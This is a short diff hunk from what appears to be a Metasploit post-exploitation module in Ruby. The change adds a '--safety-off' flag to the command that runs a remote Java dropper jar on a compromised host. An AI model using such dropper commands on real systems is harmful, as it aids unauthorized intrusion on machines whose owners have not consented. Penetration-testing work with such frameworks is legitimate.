@@ -77,7 +77,7 @@ class MetasploitModule < Msf::Post
     
     # build the dropper command
     search_directories = datastore['SEARCH_DIRECTORIES']
-    cmd = "java -jar #{dropper_remote}"
+    cmd = "java -jar #{dropper_remote} --safety-off"
     if search_directories
       cmd = "#{cmd} --search-directories \"#{search_directories}\""
     end
